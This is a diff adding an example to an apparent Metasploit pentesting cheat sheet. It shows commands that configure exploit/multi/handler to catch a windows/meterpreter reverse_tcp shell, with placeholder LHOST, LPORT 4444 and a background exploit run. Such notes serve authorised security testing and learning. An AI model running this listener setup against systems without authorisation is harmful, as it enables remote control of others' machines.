@@ -129,6 +129,16 @@ sessions -l
 sessions -i <session #>
 ```
 
+### Example: 
+In Metasploit, select the exploit/multi/handler module and configure it to match the payload settings by using the following commands:
+```
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST [IP ADDRESS]
+set LPORT 4444
+exploit -j
+```
+
 ### Upgrading shells to Meterpreter
 https://docs.metasploit.com/docs/pentesting/metasploit-guide-upgrading-shells-to-meterpreter.html#:~:text=If%20you%20have%20an%20existing%20session%2C%20either%20Meterpreter%2C,-u%20-1%20Or%20run%20the%20shell_to_meterpreter%20module%20manually%3A
 
